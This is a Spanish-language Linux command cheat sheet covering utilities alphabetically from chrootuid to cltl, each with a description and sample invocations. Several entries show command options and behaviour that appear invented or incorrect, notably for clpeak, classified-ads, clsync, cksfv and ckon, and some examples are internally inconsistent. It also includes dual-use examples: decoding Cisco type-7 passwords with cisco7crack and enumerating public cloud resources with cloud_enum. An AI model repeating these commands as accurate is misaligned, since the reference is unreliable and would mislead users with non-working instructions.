$ chrootuid /opt/restricted/ nobody /usr/bin/python3 /scripts/network_task.py (asegura que el script solo tenga acceso a los recursos dentro de /opt/restricted/ y se ejecute como el usuario nobody)
$ chrootuid /srv/ftp/ ftp /usr/sbin/vsftpd /etc/vsftpd.conf (Usar /srv/ftp/ como raíz del sistema de archivos para el servidor FTP y ejecuta el servicio vsftpd como el usuario ftp)
$ chrootuid /tmp/sandbox nobody /bin/bash (proporciona un shell restringido bajo el usuario nobody en el entorno /tmp/sandbox)
$ chrootuid /var/restricted/ nobody /usr/bin/ls /bin (lista los archivos disponibles en /bin dentro del entorno restringido)
Nota.- los binarios y bibliotecas necesarios han de estar presentes en el directorio chroot. Con ldd [ver] se puede verificar las dependencias. Por ejemplo copiandolo en el directorio chroot:
      cp /usr/sbin/nginx /var/www/usr/sbin/
      cp /lib/x86_64-linux-gnu/libc.so.6 /var/www/lib/


chrpath
Permite cambiar el rpath [donde la aplicación busca bibliotecas] de una aplicación. No permite aún agregar un rpath si no existe uno ya.
# chrpath --delete /ruta/aplicacion (eliminará cualquier rpath existente del ejecutable)
# chrpath --add /ruta/librerias:/ruta/nuevas/librerias /ruta/aplicacion (agrega un nuevo rpath al ejecutable)
# chrpath --list /ruta/aplicacion (verificar el rpath actualizado de un ejecutable)


chsh
Permite cambiar la shell del usuario especificado o del sistema.
$ cat /etc/shells (Mostrar las shells disponibles en el sistema)
$ chsh -s /bin/tcsh usuario


chvt
Cambiar de consola virtual.Si, estando en la /dev/tty1, se teclea:
$ chvt 3  (Se irá a la /dev/tty3. Lo mismo que con Ctrl+Alt+F3)
$ chvt 1; sleep 10; chvt 7 (Ir a la tty1 durante 10 segundos y volver a las X)
Nota.- Si se está en una terminal en las X con el mismo comando se irá a la misma terminal /dev/tty3.


cicle-term
El script Circle::FE::Term y el módulo Circle::FE::Term proporcionan una interfaz de terminal para el host de la aplicación Circle. Antes de usar circle-term, se necesita tener un host de aplicaciones Circle configurado y en ejecución. Esto incluye aplicaciones que utilizan el framework Circle.
$ circle-term (abrirá la interfaz de terminal y permitirá interactuar con el sistema Circle)
$ circle-term --host 192.168.1.100 (conectará al host en la dirección 192.168.1.100)
$ circle-term --exec "list-apps" (ejecutará el comando list-apps en el host Circle y mostrará el resultado)
$ circle-term --host 192.168.1.100 --port 8080 (establece una conexión al host en el puerto 8080)
Una vez conectado, se puede usar comandos Circle específicos en el terminal interactivo. Por ejemplo:
> list-apps
> start-app MyApp
> stop-app MyApp


cifsiostat
[sysstat]. Muestra estadísticas sobre las operaciones de lectura y escritura en los sistemas de archivos CIFS. Podría decirse que CIFS es una versión más reciente de SMB.
# cifsiostat -m 2 3 (en megabites por segundo cada 2 segundos y 3 informes)


cil
Permite crear un rastreador de problemas. Guarda cada problema de forma local y en texto sin formato.
$ cil init (inicialización del rastreador)
$ cil list (listar todos los problemas)
$ cil list --is-open (ver solo los problemas abiertos)
$ cil list --status=New (filtrar por un estado específico)
$ cil add (agregar un nuevo problema con detalles como título, descripción, etc)
$ cil show iffconfig (mostrar detalles de un problema)
$ cil edit <ID_DEL_PROBLEMA> (editar un problema)
$ cil status <ID_DEL_PROBLEMA> InProgress (cambiar el estado de un problema)
$ cil comment <ID_DEL_PROBLEMA> (agregar comentarios a un problema)
$ cil attach <ID_DEL_PROBLEMA> archivo.txt (subir archivos adjuntos)
$ cil extract <ID_DEL_PROBLEMA> (extraer información de un archivo adjunto)
$ cil fsck (verificar la integridad del rastreador)
$ cil summary (resumen general)


circos
Herramienta especializada en la creación de gráficos circulares para visualizar relaciones complejas entre datos, como conexiones, jerarquías, o distribuciones. El archivo de configuración en /etc/circos/circos.conf
$ circos -modules (mostrar todos los modulos disponibles)
$ circos ~/Documents (crea un gráfico del directorio con nombre circos.png y otro circos.svg)
$ circos -outputfile grafico.png -nosvg (los crea y nombra gráfico.png y sin crear el .svg)
$ circos -outputfile gráfico.svg -nopng (en formato .svg para visualizar con el navegador)


cisco7crack
Herramienta para descifrar contraseñas de tipo 7 de Cisco. Se puede utilizar para cifrar y descifrar contraseñas de dispositivos Cisco. Las contraseñas de tipo 7, que originalmente se diseñaron para permitir el descifrado rápido de contraseñas almacenadas, no son una forma segura de almacenamiento de contraseñas. Hay muchas herramientas disponibles que pueden descifrar fácilmente estas contraseñas. Se debe evitar el uso de contraseñas de tipo 7 a menos que lo requiera una función que esté en uso en el dispositivo Cisco IOS.
$ cisco7crack -q -c "contraseña terrible" (cifrar sin mostrar el texto plano)
$ cisco7crack -d 00071C0810490A150AFFFFFF82FFFFFF9D4F490D000500020E082F (descifrar)


cjb2
Convierte formatos .PBM o .TIFF a DJVU
$ cjb2 -dpi 500 entrada.pbm salida.djvu (especificando resolución [parámetros entre 25 y 1200. Por defecto 300])


cjpeg
Convierte formatos PPM, PGM, BMP, Targa y RLE a jpeg.
$ cjpeg -grayscale -quality 60 archivo.ppm > nuevo.jpg (a escala de grises y con una calidad de 60 [ por defecto0 75])


ck-history
Listado de los logeos en el sistema [tty, pts, ssh...]
$ ck-history --frequent
$ ck-history --last-compat
$ ck-history --last | less


ck-list-sessions
Listado de sesiones abiertas en la máquina.


ckb-next
Controlador de código abierto para teclados y ratones Corsair. Su objetivo es incorporar las características del software CUE, propiedad de Corsair, a los sistemas operativos Linux y Mac.


ckeditor
Editor WYSIWYG que se puede incrustar en páginas web. WYSIWYG significa que el texto que se está editando se ve lo más similar posible a los resultados que obtienen los usuarios al publicarlo.


ckermit
Paquete combinado de software de comunicación en red y serial que ofrece un enfoque multiplataforma seguro, consistente e independiente del medio para el establecimiento de conexiones, sesiones de terminal, transferencia de archivos, traducción de conjuntos de caracteres y automatización de tareas de comunicación.
$ ckermit -l /dev/ttyS0 -b 115200 (intentará conectar ckermit a la interfaz serial /dev/ttyS0 a una velocidad de 115200 baudios)
$ ckermit -s file.txt > /dev/ttyS0 (transferir desde el hosts al dispositivo conectado)
$ ckermit < /dev/ttyS0 > file.txt (transferirr desde el dispositivo conectado al host)
Crear o editar un archivo de configuración con opciones como:
$ nano  ~/.ckermitrc
...
set login user=mi_usuario
set password=mia_contraseña
set host=192.168.1.100
set port=23
...


ckon
Programa que se encarga automáticamente de la compilación, la generación de diccionarios y la vinculación de programas y bibliotecas desarrollados para análisis de datos dentro del marco de análisis ROOT de CERN. Esto incluye el análisis de encabezados de inclusión para determinar a qué bibliotecas deben vincularse los programas principales. Utiliza automake/autoconf para ser independiente de la plataforma y compatible con la instalación de GNU. Además, las macros m4 se descargan automáticamente y se incluyen los indicadores de compilador correspondientes según una lista de bibliotecas boost proporcionada en el archivo de configuración. Para el uso de la base de datos YAML, se puede descargar una macro m4 durante la configuración para vincularla con la biblioteca yaml-cpp.
$ ckon example.C (del archivo fuente example.C generará un archivo ejecutable llamado example, vinculado automáticamente con las bibliotecas necesarias
$ ckon main.C utils.C (compilará múltiples archivos fuente y vinculará los archivos)
$ ckon -cflags "-O2 -Wall" -ldflags "-lm" myprogram.C (especifica flags para el compilador y para el vinculador)
$ ckon -libs "-lMyLibrary" myprogram.C (asegura que ckon enlace el programa con la biblioteca libMyLibrary)
$ ckon -dict MyClass.h (crea un archivo de diccionario necesario para las clases definidas en MyClass.h)
$ ckon -libs "-L/path/to/lib -lMyLibrary" myprogram.C (una biblioteca compartida desarrollada previamente, se puede vincular al programa)
$ ckon --clean (limpiar los archivos generados durante la compilación)
$ ckon -debug myprogram.C (genera un ejecutable con símbolos de depuración)
$ ckon -j4 myprogram.C (utiliza 4 núcleos durante la compilación)


cksfv
[SFV - Simple File Verification]. Utilitadad para verificar la integridad de archivos utilizando sumas de comprobación CRC32.
$ cksfv -c arhivo.txt (calculará una suma CRC32 del archivo "archivo.txt" y la comparará con el valor almacenado en el archivo mismo, si existe. Si los valores coinciden, el archivo está intacto)
$ cksfv -c arhivo1.txt archivo2.txt archivo3.txt (verificar varios archivos)
$ cksfv -c arhivo.txt > checksum.txt (creará un archivo llamado "checksum.txt" que contiene la suma CRC32 calculada para "archivo.txt")
$ cksfv -v archio.txt < checksum.txt (verificará si el archivo "archivo.txt" coincide con la suma CRC32 almacenada en "checksum.txt")
$ cksfv -r /ruta/del/directorio (verificará la integridad de todos los archivos en el directorio especificado y sus subdirectorios)


cksum
Suma de comprobación y número de bytes de un archivo.
$ cksum archivo


clamassassin
Script para escanear un mensaje de correo electrónico en busca de virus y malware. Un mensaje de correo electrónico se lee en la entrada estándar, se escanea en busca de virus con el motor antivirus ClamAV y se anotan los resultados del escaneo en la salida estándar. Si un mensaje está infectado con un virus, el encabezado X-Virus-Status se establece en Sí y el encabezado X-Virus Report se establece en los virus encontrados. Si el mensaje está bien, se envía con X-Virus-Status establecido en No.
$ clamassassin Fra-_12-24.pdf (analizar un adjunto a un correo)


clamav
Detecta troyanos, virus, malware y otras amenazas maliciosas.
# freshclam -v (actualizar la lista de virus viendo detalles)
# freshclam -d -c 24    (arranca el demonio que actualizará clamav 24 veces diarias- Maximo 50 veces diarias)
# clamscan -ri    (Sin especificar directorio, escanear el del usuario)
# clamscan -ri --remove /home/usuario  (escanea el directorio usuario, solo mostrando los infectados y los borra directamente)
# clamscan -v -r -l test_clamav.txt  (revisa directorios y subdirectorios mostrando máxima información y manda el resultado a un archivo)
# clamscan -v -r --bell --move=/home/usuario/cuarentena -l /var/log/clamav/clamav.log /media/win (aviso sonoro al detectar un virus, mandarlos a cuarentena y los logs en clamav.log)
# sigtool --list-sigs > list (listado de virus y troyanos que detecta)
# clamdtop (monitorear análisis con ncurses)
# clamconf (muestra la configuración completa)
# dpkg-reconfigure clamav-base (reconfigurar paquete)
1.-
Para el archivo de configuración
# cp /usr/share/doc/clamav-freshclam/examples/freshclam.conf.sample /etc/clamav/clamav.conf
Y descomentar lo que se cree necesario.
2.-
Para asegurarse de que clamav y las definiciones estén instaladas correctamente, se puede escanear el archivo de prueba EICAR [una firma inofensiva sin código de virus]:
$ curl https://secure.eicar.org/eicar.com.txt | clamscan -
La salida debe incluir:
	stdin: Win.Test.EICAR_HDB-1 FOUND


clamav-cvdupdate
Herramienta de actualización de espejos de bases de datos privadas de ClamAV. Las bases de datos estas en /var/lib/clamav
# cvdupdate update (recargar la base de datos de clamav)
# cvdupdate list (lista las bases de datos que se encuentran en el directorio de la base de datos)
# cvdupdate list -V (lista las bases de datos)
# cvdupdate remove bytecode.cvd (Elimina una base de datos de la lista de bases de datos conocidas y elimina copias locales)


clamav-unofficial-sigs
Descarga, prueba e instala la base de datos de firmas ClamAV de terceros.
# clamav-unofficial-sigs


clamfs
Sistema de archivos basado en FUSE para Linux con escaneo de archivos con antivirus en tiempo real a través del demonio clamd. Clamd (clamav-daemon) es un servicio de escaneo de archivos desarrollado por el proyecto ClamAV. El archivo /etc/clamfs/clamfs.xml se puede bajar de https://sourceforge.net/p/clamfs/code/HEAD/tree/tags/clamfs-1.0.1/doc/clamfs.xml
# clamfs /etc/clamfs/clamfs.xml (Iniciar el demonio del monitoreo del sistema de archivos)
# clamfs -c /etc/clamfs.conf /mnt/clamfs (Montar el sistema de archivos)
# clamfs -o srcdir=/data/incoming,ro /mnt/clamfs (montar en modo de solo lectura)
# systemctl status clamav-daemon (que el demonio clamd esté en ejecución antes de usar clamfs)
Crear un archivo de configuración:
# nano /etc/clamfs.conf:
srcdir=/data/incoming
logfile=/var/log/clamfs.log
# clamfs -o srcdir=/data/incoming,logfile=/var/log/clamfs.log /mnt/clamfs (directorio de origen que será monitoreado, donde se registrarán las operaciones y punto de montaaje)
Si se necesita monitorear varios directorios, puedes montar cada uno con diferentes configuraciones.
# clamfs -o srcdir=/data/incoming,logfile=/var/log/clamfs_incoming.log /mnt/clamfs_incoming
# clamfs -o srcdir=/data/uploads,logfile=/var/log/clamfs_uploads.log /mnt/clamfs_uploads
# fusermount -u /mnt/clamfs (desmontar el sistema de archivos)
ClamFS puede configurarse para realizar escaneos más exhaustivos:
# nano /etc/clamd.conf
MaxScanSize 50M
ArchiveMaxRecursion 5
# systemctl restart clamav-daemon (reiniciar el demonio)
# clamfs -d -o srcdir=/data/incoming /mnt/clamfs (activa mensajes detallados de depuración)


clamscan
Ver clamav


clamsmtp
Demonio proxy SMTP que busca virus mediante el software antivirus ClamAV para buscar virus en los mensajes de correo electrónico. Puede actuar como un proxy SMTP tradicional con puertos de acceso público o como un proxy transparente, donde el tráfico SMTP se redirige a ClamSMTP a través de su enrutador. Asegurarse que el archivo de configuración:
# nano /etc/clamav/main.conf
Tenga la linea:
SMTPD_USER=clamav


clamz
Está pensado para servir como sustituto del descargador de MP3 oficial de Amazon, que no es un software gratuito. Clamz se puede utilizar para descargar canciones individuales o álbumes completos que se hayan comprado en Amazon.
$ clamz album.amz (descargará automáticamente todos los archivos MP3 incluidos en el archivo album.amz)
$ clamz song.amz (archivo MP3 se descargará en el directorio actual)
$ clamz -o /Musica/amazon/ album.amz (guarda los archivos descargados en el directorio mencionado)
$ clamz *.amz (descargar todos los archivos .amz)
$ clamz -q album.amz (minimizará la información mostrada en la terminal)
$ clamz -r 3 album.amz (intentará descargar el álbum hasta 3 veces en caso de fallo)


clanlib
ofrece una interfaz independiente de la plataforma para escribir juegos. Si un juego está escrito con ClanLib, debería ser posible compilarlo en cualquier plataforma (compatible con ClanLib, claro está) sin cambiar el código fuente de la aplicación. Pero ClanLib no es solo una biblioteca contenedora, que proporciona una interfaz común para bibliotecas de bajo nivel como DirectFB, DirectX, OpenGL, X11, etc. Si bien la independencia de la plataforma es el objetivo principal de ClanLib, también intenta ser un SDK de juegos orientado al servicio. En otras palabras, se ha puesto un gran esfuerzo en el diseño de la API, para garantizar la facilidad de uso de ClanLib, manteniendo al mismo tiempo su potencia. Este paquete contiene documentación html [file:///usr/share/doc/clanlib-doc/Overview/index.html] para la API de ClanLib y algunos tutoriales para facilitar la curva de aprendizaje para programar con ella.


classified-ads
Herramienta diseñada para emular la funcionalidad de los antiguos anuncios clasificados en Usenet News que desapareció cuando Usenet News dejó de existir. Este intento intenta solucionar el problema de la desaparición de los servidores de noticias para que no se requieran servidores; el almacenamiento de datos se implementa dentro de las aplicaciones cliente que ejecutan los usuarios. Aunque no reemplaza completamente a Usenet, classified-ads intenta emular la simplicidad y accesibilidad de sus funciones.
$ classified-ads post --title "Venta de bicicleta" --category "Deportes" --body "Bicicleta de montaña en excelente estado. Precio: $200. Contacto: email@example.com" (publica un anuncio en la categoría "Deportes" con el título y cuerpo especificados)
$ classified-ads list (mostrará una lista de anuncios clasificados publicados en todas las categorías)
$ classified-ads list --category "Electrónica" (mostrará todos los anuncios clasificados en la categoría "Electrónica")
$ classified-ads list --search "bicicleta" (mostrará todos los anuncios que contengan la palabra "bicicleta" en el título o en el cuerpo)
$ classified-ads delete --id 12345 (elimina el anuncio con el ID 12345. Generalmente, se necesita algún tipo de autenticación o token para confirmar que eres el autor del anuncio)
$ classified-ads edit --id 12345 --title "Venta de bicicleta usada" --body "Bicicleta de montaña usada, buen estado. Precio negociable. Contacto: nuevoemail@example.com" (actualizará el anuncio con el ID 12345, cambiando el título y el cuerpo según lo indicado)
$ classified-ads export --output anuncios.txt (guarda todos los anuncios en un archivo llamado anuncios.txt)
$ classified-ads server --host 0.0.0.0 --port 8080 (inicia un servidor que permite a otros usuarios conectarse y publicar o buscar anuncios)
$ classified-ads post --title "Venta de coche" --category "Automóviles" --body "Coche en buen estado, modelo 2015. Precio: $8000." --server http://servidor-remoto:8080 (publica el anuncio en el servidor especificado)


clazy
Complemento de Clang que amplía el compilador con más de 50 advertencias relacionadas con las mejores prácticas de Qt, que van desde asignaciones de memoria innecesarias hasta usos incorrectos de API.
$ clazy -c -o main.o main.cpp (analiza el archivo main.cpp, genera advertencias específicas de Qt y produce un objeto compilado main.o)
$ clazy -c -o main.o main.cpp -Wclazy-qstring-arg (se activa la advertencia qstring-arg, que detecta el uso ineficiente de QString::arg)
$ clazy -c -o main.o main.cpp -Wno-clazy-qstring-arg (deshabilita la advertencia qstring-arg para el archivo main.cpp)
$ clazy -list-checks(lista con todas las verificaciones que clazy puede realizar)
$ clazy -c -fdiagnostics-format=detailed -o main.o main.cpp (mostrará información más detallada sobre cada advertencia, incluyendo el tipo y la ubicación exacta)
$ clazy -c -o main.o main.cpp -Wclazy-all (habilitar todas las verificaciones disponibles que permiten realizar un análisis exhaustivo del código fuente)
$ clazy -c -o main.o main.cpp -Wclazy-use-std-move (detectar usos incorrectos de std::move o std::forward)
$ clazy -c -o main.o main.cpp -Wclazy-range-loop (iteraciones ineficientes sobre contenedores Qt)
Para analizar un proyecto completo basado en Qt, se combina clazy con herramientas como cmake o make utilizando el entorno de compilación Clang:
$ cmake -DCMAKE_CXX_COMPILER=clazy ..
$ make
Configurará el proyecto para usar clazy como compilador C++, integrando sus advertencias durante la compilación.


clazy-test
Ejecutar y verificar los tests relacionados con las verificaciones de clazy.
$ clazy-test --all (ejecutará todas las pruebas disponibles y mostrará los resultados en la terminal)
$ clazy-test --test qstring-arg (ejecutará el test relacionado con la advertencia qstring-arg)
$ clazy-test --path ~/dirs/tests (ejecutar tests desde un directorio personalizado)
$ clazy-test --verbose (mostrará información adicional, como el código analizado, las advertencias generadas y las posibles fallas)
$ clazy-test --file nuevo_test.cpp --check nueva-regla (permite verificar que si una regla personalizada funciona correctamente)
$ clazy-test --all --output resultados.txt (guardar los resultados del test en un archivo para referencia futura)


cldump
permite extraer el contenido de una base de datos Clarion, un IDE de Windows similar a Delphi y otros y tiene su propio formato de base de datos. Puede exportar el contenido de la base de datos a CSV o SQL, además de su propio "formato" que vuelca todos los metadatos junto con los datos contenidos en la base de datos. Al utilizar la salida SQL, se obtendrá un volcado casi listo para usar de la base de datos que creará la tabla y los índices e insertará los datos en la tabla.
$ cldump -a rchivo_clarion > salida.txt (extraer todos los registros)
$ cldump -t abla1 tabla2 archivo_clarion > salida.tabla1.txt salida.tabla2.txt (extraer solo ciertas tablas)
$ cldump -s archivo_clarion (mostrar estructura de la base de datos)
$ cldump -f campo1,campo2 archivo_clarion > salida.csv (extraer datos específicos de una tabla)


cleancss
Módulo de Node.js para minimizar archivos CSS. Realiza el mismo trabajo que el minificador de CSS de YUI Compressor, pero mucho más rápido gracias a muchas optimizaciones de velocidad y al motor V8 de Node.js.
$ cleancss -d archivo.css -o salida (con la máxima información y guardando la salida en un archivo)


clear
Limpiar la terminal.


clear_console
[bash]. Borra la consola tty. Equivalente a C-l


cleo
Utilidad para reproducir comandos de shell pregrabados en una demostración en vivo. cleo muestra los comandos como si realmente los hubiera escrito y luego los ejecuta de forma interactiva.
$ cleo demo.txt (leerá el archivo demo.txt, mostrará cada comando, uno por linea, al pulsar alguna tecla se escribirá el comando, otra pulsación lo ejecutara en la terminal)


clevis
Herramienta para gestionar el descifrado automático de datos. Se puede utilizar para proporcionar descifrado automático de datos o incluso desbloqueo automático de volúmenes LUKS. Si aún no se tiene un volumen LUKS, se crea y se configura para desbloqueo automático:
Crear el volumen cifrado
# cryptsetup luksFormat /dev/sdX
# cryptsetup open /dev/sdX my_encrypted_volume
# mkfs.ext4 /dev/mapper/my_encrypted_volume
Configurar clevis con TPM
# clevis luks bind -d /dev/sdX tpm2 '{}' (configura el volumen para desbloqueo automático en el hardware actual)
# clevis luks unlock -d /dev/sdX (desbloquear el volumen automáticamente utilizando las credenciales almacenadas en el TPM)
# clevis luks bind -d /dev/sdX http '{"url":"http://example.com/unlock"}' (el servidor remoto debe devolver un token o clave válida para desbloquear el volumen)
# clevis luks unlock -d /dev/sdX (el comando contactará con el servidor configurado para obtener la clave de desbloqueo)
# clevis luks list -d /dev/sdX (muestra detalles sobre los métodos configurados como TPM o HTTP)
# clevis luks unbind -d /dev/sdX -s <slot_number> (reemplazar <slot_number> con el número del slot configurado por clevis que puede obtenerse con el comando list)
Se puede usar clevis para cifrar y descifrar datos sin LUKS, por ejemplo, usando un archivo.
# echo "My secret data" | clevis encrypt 'pass' '{"key":"my_password"}' > secret.txt (cifrar un archivo con una contraseña)
# cat secret.txt | clevis decrypt (pedirá la contraseña para descifrar los datos)
# clevis luks bind -d /dev/sdX -s 1 http '{"url":"http://example.com/unlock"}' (configura el volumen para desbloquearse con HTTP además del TPM)
# clevis tpm2 status (verificar si el sistema tiene un TPM disponible y es compatible con clevis)


clex
Administrador de archivos. Para cerrar el programa pulsar "Esc Q"
Algunas teclas de control:
	Ctrl-c (salir de cada una de las opciones siguientes)
	alt-m (menú principal)
	alt-w (Cambiar de directorio)
	alt-s (Cambiar el tipo de visualización)
	alt-/ (entrar en el directorio raiz)
	alt-~ o alt-` (Entrar en el directorio $HOME)
	ctrl-r (Actualizar panel)
	F4 (Editar archivo [vim])
	F5 (Copiar)
	F8 (Borrar)


cli-spinner
Línea de comando simple que muestra un indicador de barra inclinada. El binario cli-spinner no es realmente funcional, es un ejemplo de línea de comandos.


click
Formato de paquete simplificado que se instala en una parte separada del sistema de archivos, adecuado para aplicaciones de terceros.
Crear una aplicación CLI usando click de ejemplo:
$ mkdir mi_app_cli
$ cd mi_app_cli
$ touch main.py
Editar main.py y agregar el siguiente código
from click import command
@command()
def mi_comando():
    print("Hola desde mi comando personalizado!")
$ python main.py mi_comando (ejecutar la aplicación)


click-man
Crear páginas de manual para aplicaciones basadas en click en función de sus cadenas de ayuda.


clickhouse-client
Sistema de gestión de bases de datos orientado a columnas que permite generar informes de datos analíticos en tiempo real.
$ clickhouse-client --host <hostname> --port <port> --user <username> --password <password> (conectar al servidor de ClickHouse. Por defecto, localhost y puerto 9000. Si no precisa especificar usuario o contraseña se puede omitir)
$ clickhouse-client -q "SELECT * FROM my_table LIMIT 10" (consulta SQL para seleccionar datos de una tabla llamada my_table)
$ clickhouse-client -q "CREATE TABLE my_table (id UInt32, name String) ENGINE = MergeTree() ORDER BY id" (crear una tabla)
$ clickhouse-client -q "INSERT INTO my_table (id, name) VALUES (1, 'Alice'), (2, 'Bob')" (insertar datos en la tabla my_table)
$ clickhouse-client -q "SELECT COUNT(*) FROM my_table" (contar el número de registros)
$ clickhouse-client -q "SELECT * FROM my_table" --format CSV > output.csv (exportar resultados de consultas a un archivo)
$ clickhouse-client --query "INSERT INTO my_table FORMAT CSV" < input.csv (cargar datos desde un archivo CSV a una tabla)
$ clickhouse-client --database=my_database -q "SHOW TABLES" (con múltiples bases de datos en ClickHouse, se ha de especificar cual)
$ clickhouse-client --queries-file=script.sql (ejecutar directamente un script SQL)


clinfo
Imprime la información disponible sobre todas las plataformas OpenCL disponibles en el sistema y los dispositivos que exponen. Enumera todas las plataformas posibles y propiedades del dispositivo inspirado por el programa de AMD del mismo nombre e intenta generar toda la información posible
$ clinfo -l (enumerar plataformas y dispositivos por nombre, sin otras propiedades)


clipit
Administrador de portapapeles que ha quedado obsoleto. Debian lo ha substituido por diodon [ver]


clisp
Es una implementación de Common Lisp.
$ clisp (entra en la interfaz de la aplicación)
>


clitest
Busca fragmentos de texto que se parezcan a líneas de comandos interactivas de Unix y luego ejecuta esas líneas de comandos para verificar que funcionen exactamente como se muestran.
$ cat test.txt
      $ echo "linux es un sistema genial"
      linux es un sistema genial
$ clitest test.txt (el archivo indica que al ejecutar el comando echo "linux es un sistema genial", la salida esperada es linux es un sistema genial)
      #1	echo "linux es un sistema genial"
      OK: 1 of 1 test passed
Con un error en el comando "echo" [ech]:
$ cat test.txt
      $ ech "linux es un sistema genial"
      linux es un sistema genial
$ clitest test.txt
      #1	ech "linux es un sistema genial"
      ------------------------------------------------------
      [FAILED #1, line 1] ech "linux es un sistema genial"
      @@ -1 +1 @@
      -linux es un sistema genial
      +/usr/bin/clitest: 1: eval: ech: Permission denied
      ------------------------------------------------------
      FAIL: 1 of 1 test failed
Otras pruebas que se pueden realizar:
$ clitest -l test.txt (Listar sin ejecutar todas las pruebas)
$ clitest -1 test.txt (detener a la primera prueba fallida)
$ clitest -L test.txt (muestra en verde las pruebas OK y en rojo las FAIL)
$ clitest -P none test.txt (establecer indicador de prueba [test, number, dot, none])
$ clitest --color auto --post-flight 'echo "prueba realizada"' -P test test.txt (Ejecutar un comando después de ejecutar la última prueba)


clive
Descarga de videos de youtube.
$ clive http://video -O titulo (Dándole un titulo al vídeo)


cloc
Cuenta lineas de código, lineas en blanco y lineas con comentarios en varios leguajes de programación.
$ cloc script.sh
$ cloc archivo.tar.gz
$ cloc --by-file dir/ (de todos los scripts de un directorio)
$ clod --out=info.txt (guardar la salida en un fichero)


clog
Útil para revisar archivos de registro con tail [ver]. Puede detectar patrones en un flujo de entrada y colorear o suprimir las líneas. También puede decorar las líneas con marcas de fecha o hora.
$ nano .clogrc
       # Standard syslog entries.
              default rule /warn|debug/   --> yellow line
              default rule /error|severe/ --> red line
              default rule /critical/     --> bold red line
              default rule /critical/     --> blank
              default rule /ignore/       --> suppress
       # Apache access.log status codes
              apache rule / 2[0-9][0-9] / --> green match
              apache rule / 3[0-9][0-9] / --> yellow match
              apache rule / 4[0-9][0-9] / --> red match
              apache rule / 5[0-9][0-9] / --> bold red match
$ sudo tail -f /var/log/auth.log | clog -d 2024-12-15 (especificar una fecha en formato inglés)
$ sudo tail -f /var/log/auth.log | clog -t 01:05:01 (especificar una hora, minuto y segundo de hoy)


clonezilla
Sistema de clonación que guarda y restaura solo los bloques usados en el disco duro. Consta de casi 80 utilidades [ocs-scan-disk, ocs-socket, cnvt-ocs-dev, create-debian-live...]


cloud_enum
Herramienta que se utiliza para enumerar recursos públicos en nubes públicas con diferentes proveedores como AWS, Azure y Google Cloud, y devolver información sobre los recursos que están disponibles públicamente, identificando aquellos que coinciden con palabras clave específicas.
$ cloud_enum --keyword "test" --provider aws (buscaría instancias, buckets y otros recursos en AWS que tengan "test" en su configuración o nombre)
$ cloud_enum --keyword "demo" --provider azure (revisaría los recursos públicos en Azure que coincidan con "demo")
$ cloud_enum --keyword "production" --provider gcp (enumeraría los recursos que contienen "production" en Google Cloud)


cloud-guest-utils
Utilidades diseñadas para facilitar la interacción y gestión de instancias de nube. Estas herramientas están optimizadas para entornos virtualizados o basados en la nube como AWS, GCP, Azure y OpenStack. Su objetivo es simplificar tareas comunes, como la gestión de discos, particiones y datos de instancia. El paquete suele complementarse con cloud-init [ver], que automatiza tareas de configuración inicial en instancias de nube.
# growpart /dev/sda1 (extender la partición sda1 para utilizar todo el espacio disponible)
Una vez que la partición ha sido extendida, también se debe redimensionar el sistema de archivos.
# resize2fs /dev/sda1
Y comprobar que las particiones están intactas tras un redimensionamiento y detectar el nuevo tamaño del disco:
$  fsck -f /dev/sda1
$ lsblk


cloud-init
Permite configurar y personalizar máquinas virtuales [VMs] al inicio. Es compatible con varias plataformas de Infraestructura como Servicio (IaaS), como AWS, Azure, Google Cloud, OpenStack, entre otras. Por ejemplo, puede establecer una configuración regional y un nombre de host predeterminados, generar claves de host privadas SSH, instalar claves públicas SSH para iniciar sesión en una cuenta predeterminada, configurar puntos de montaje efímeros y ejecutar scripts proporcionados por el usuario.
# cloud-init status (muestra el estado actual de cloud-init)
# cloud-init init (reinicializar las configuraciones de cloud-init desde cero útil si se ha limpiado configuraciones anteriores)
# cloud-init clean (limpiar los datos actuales)
# cloud-init clean --logs (limpieza de logs)
# cloud-init query ds.meta_data.hostname (devuelve el nombre del host configurado por el proveedor de nube)
# cloud-init analyze blame (muestra un desglose de cuánto tiempo tomó cada módulo)


cloudflare-ddns
Es un programa one-shot: lo ejecutas, actualiza el registro DNS y finaliza. Utiliza la API de Cloudflare, por lo que para ejecutar la herramienta se necesita un token de API y el ID de la zona DNS que se desea actualizar. Este paquete contiene la herramienta y un conjunto de unidades systemd que la hacen ejecutarse periódicamente cuando tienes una dirección IP dinámica.
$ cloudflare-ddns (ejecutará el programa una vez y actualizará el registro DNS con tu dirección IP actual)
$ cloudflare-ddns --api-token YOUR_API_TOKEN --record-name your-record.example.com (ejecutar el comando pasando los parámetros API Token y nombre del registro como argumentos y actualizará específicamente ese registro DNS)


clpeak
Herramienta de evaluación comparativa sintética para medir las capacidades máximas de los dispositivos OpenCL. Solo mide las métricas máximas que se pueden lograr mediante operaciones vectoriales y no representa un caso de uso del mundo real.
$ clpeak --device 0 --image-size 256x256 --iterations 1000000 (Este comando evalúa el rendimiento del dispositivo OpenCL en la operación de copiar datos)
$ clpeak --device 0 --image-size 512x512 --iterations 500000 --vector-size 16 --local-work-size 64 --global-work-size 1024 (especifica un tamaño de imagen más grande y añade algunas opciones avanzadas para ajustar el trabajo local y global)
$ clpeak --device 0 --device 1 --image-size 256x256 --iterations 1000000 (compara el rendimiento entre dos dispositivos OpenCL)
$ clpeak --device 0 --image-size 256x256 --iterations 1000000 --verbose (proporciona un salida más detallada con información adicional sobre el rendimiento)
$ clpeak --device 0 --image-size 512x512 --iterations 500000 --profile (genera un perfil del tiempo de ejecución para cada operación OpenCL)


clsync
Comando específico de Debian que se utiliza para sincronizar archivos entre dos directorios. Si se usa otro sistema operativo puede usarse "rsync" [ver]
$ clsync /ruta/original /ruta/destino (buscará todos los archivos en el directorio original y los copiará al directorio destino)
$ clsync -f /ruta/original /ruta/destino (fuerza la sobrescritura de archivos existentes en el directorio destino)
$ clsync -m /ruta/original /ruta/destino (solo sincroniza los archivos que han sido modificados desde la última sincronización)
$ clsync -p /ruta/original /ruta/destino (mantiene los permisos de los archivos durante la sincronización)
$ clsync -t /ruta/original /ruta/destino (asegura que los archivos más recientes se mantengan en el directorio destino)
$ clsync -r /ruta/original /ruta/destino (que el comando busque y sincronice todos los subdirectorios de forma recursiva)


cltl
